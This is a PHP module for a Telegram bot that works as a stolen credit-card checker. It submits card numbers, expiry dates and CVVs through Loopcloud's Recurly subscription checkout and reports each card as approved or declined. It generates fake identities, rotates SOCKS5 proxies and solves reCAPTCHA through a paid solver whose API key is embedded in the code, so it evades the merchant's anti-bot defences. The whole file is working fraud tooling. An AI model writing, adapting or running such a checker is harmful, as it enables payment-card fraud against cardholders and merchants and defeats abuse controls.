<?php
require_once __DIR__ . '/../common.php';
ini_set("log_errors", TRUE);
ini_set("error_log", "./error_log.txt");

if(cmd($message, "chk")){
        is_registerv();
$NameGater ='Recurly';
$gateway = "/chk $NameGater";
is_gateroff($NameGater); //off Gater
is_freeuser(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Stripe Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!chk card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>
"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #


$rotate = rotate();
$socks5 = socks5();

if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}


if ($mes < 10) {
    $mes = substr($mes, -1);
}







$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,2343). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];

$zip = $user["location"]["postcode"];

$areaCode = rand(201, 999);
$centralOfficeCode = rand(100, 999);
$lineNumber = rand(1000, 9999);

$phone = $areaCode . $centralOfficeCode . $lineNumber;
$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];




$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos






while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language: es-ES,es;q=0.9',
            'priority: u=0, i',
            'referer: https://www.loopcloud.com/cloud/',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];
        $req2 = $curl::Get('https://www.loopcloud.com/cloud/subscriptions/plans?_gl=', $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer: https://www.loopcloud.com/cloud/subscriptions/plans',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];
        $req2 = $curl::Get('https://www.loopcloud.com/cloud/subscriptions/new?plan_id=6', $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

    
        $authenticity_token = ($curl::ParseString($req2->body, '<input type="hidden" name="authenticity_token" value="', '"'));
        if ($authenticity_token == "null") {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }


        $solution = $solver->recaptchaV2(
            \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
            [
              'websiteURL'    => 'https://www.loopcloud.com/',
              'websiteKey'    => '6LfoWZYUAAAAAKWThBl0PyxaupSiahO6MIZr-1gg',
            ]
        );

        $captcha = $solution["gRecaptchaResponse"];

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.loopcloud.com',
            'referer: https://www.loopcloud.com/cloud/login_register',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];
        $data = 'utf8=%E2%9C%93&authenticity_token='.urlencode($authenticity_token).'&user%5Bterms%5D=1&cm=&after_login_path=&user%5Bemail%5D='.urlencode($email).'&user%5Bpassword%5D=Password3022&user%5Bpassword_confirmation%5D=Password3022&g-recaptcha-response='.$captcha.'&user%5Bnewsletter_subscription%5D=true&user%5Bother_newsletter_subscription%5D=false';
        $req2 = $curl::Post('https://www.loopcloud.com/cloud/subscriptions/registration', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $authenticity_token = ($curl::ParseString($req2->body, '<input type="hidden" name="authenticity_token" value="', '"'));
        if ($authenticity_token == "null") {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: */*',
            'accept-language: es-ES,es;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://api.recurly.com',
            'referer: https://api.recurly.com/js/v1/field.html',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];

        $deviceId = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 16);
        $sessionId = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 16);
        $instanceId = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 16);

        $data = 'first_name='.$firstname.'&last_name='.$lastname.'&address1='.urlencode($street).'&city='.urlencode($city).'&country=US&postal_code='.$zip.'&state='.$regioncode.'&token=&number='.$cc.'&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-ES&browser[referrer_url]=https%3A%2F%2Fwww.loopcloud.com%2Fcloud%2Fsubscriptions%2Fnew%3Fspi%3D1&browser[screen_height]=768&browser[screen_width]=1366&browser[time_zone_offset]=300&browser[user_agent]=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36&month='.$mes.'&year='.$ano.'&cvv='.$cvv.'&version=4.29.0&key=ewr1-C9TNhCAwlAdyxwMsx9aWuo&deviceId='.$deviceId.'&sessionId='.$sessionId.'&instanceId='.$instanceId.'';
        $req2 = $curl::Post('https://api.recurly.com/js/v1/token', $data, $headers, $cookie, $server);

        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $data = json_decode($req2->body, true);
        $id = $data["id"];


        if (!$id) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.loopcloud.com',
            'referer: https://www.loopcloud.com/cloud/subscriptions/new?spi=1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];
        $data = 'utf8=%E2%9C%93&authenticity_token='.urlencode($authenticity_token).'&cm=&subscription%5Bbilling_info_attributes%5D%5Bfirst_name%5D='.$firstname.'&subscription%5Bbilling_info_attributes%5D%5Blast_name%5D='.$lastname.'&subscription%5Bbilling_info_attributes%5D%5Baddress%5D='.urlencode($street).'&subscription%5Bbilling_info_attributes%5D%5Bcity%5D='.urlencode($city).'&subscription%5Bbilling_info_attributes%5D%5Bcountry%5D=US&subscription%5Bbilling_info_attributes%5D%5Bpostal_code%5D='.$zip.'&subscription%5Bbilling_info_attributes%5D%5Bprovince%5D=WA&promo_code=&recurly_token='.$id.'&terms=on';
        $req2 = $curl::Post('https://www.loopcloud.com/cloud/subscriptions', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }


        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}

$mgs = ($curl::ParseString(html_entity_decode($req2->body), '<div data-react-class="Flash" data-react-props="{"kind":"error","msg":"', '"}"'));

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);



if(substr_count($req2->body, 'The security code you entered does not match. Please update the CVV and try again.')){
$status = "APPROVED ✅ ";
$response = "The security code you entered does not match. Please update the CVV and try again. ";
}elseif(substr_count($req2->body, 'Your billing address does not match the address on your account. Please update your address or contact your bank.')){
$status = "APPROVED #avs✅ ";
$response = "Your billing address does not match the address on your account. Please update your address or contact your bank.";
}elseif(substr_count($req2->body, 'Thank you for signing') || substr_count($req2->body, 'Just choose your download to get started')){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "DECLINED #DEAD ❌";
$response = $mgs;
}



            
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
}

?>
